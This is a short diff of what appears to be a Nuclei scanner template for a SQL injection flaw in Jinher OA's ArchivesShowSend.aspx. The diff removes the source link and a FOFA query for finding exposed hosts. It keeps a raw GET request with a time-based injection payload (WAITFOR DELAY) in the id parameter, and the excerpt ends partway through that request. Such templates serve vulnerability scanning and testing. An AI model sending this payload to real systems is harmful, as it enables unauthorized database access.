@@ -3,12 +3,8 @@ info:
   name: 金和OA ArchivesShowSend.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ic5i8b0krr5r3abq'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ic5i8b0krr5r3abq
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/Jhsoft.Web.Archives/ArchivesShowSend.aspx/?id=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
